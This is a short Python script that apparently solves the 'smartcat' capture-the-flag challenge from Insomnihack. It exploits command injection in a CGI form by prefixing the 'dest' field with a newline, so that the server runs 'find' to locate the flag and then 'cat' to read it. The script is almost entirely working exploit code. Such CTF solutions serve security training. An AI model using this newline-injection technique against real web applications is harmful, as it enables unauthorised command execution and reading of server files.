#!/usr/bin/python

import requests

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

def getcmdoutput(content):
	cmdoutput = []
	preparsing = False
	for line in r.content.splitlines():
		if preparsing == True:
			cmdoutput.append(line)

		if '<pre>' in line:
			preparsing = True
			cmdoutput.append(line.replace("<pre>",""))

		if '</pre>' in line:
			preparsing = False
	return cmdoutput

s = requests.Session()

payload = { 'dest' : chr(0xa) + 'find'}

print "[*] Finding Flag..." 
r = s.post(URL, data=payload)
cmdoutput = getcmdoutput(r.content)
print "[*] Flag is here:" + cmdoutput[len(cmdoutput)-2]

payload = { 'dest' : chr(0xa) + 'cat<'+cmdoutput[len(cmdoutput)-2] }
print "[*] Getting Flag..." 
r = s.post(URL, data=payload)
cmdoutput = getcmdoutput(r.content)
print "[*] Flag: " + cmdoutput[len(cmdoutput)-2]
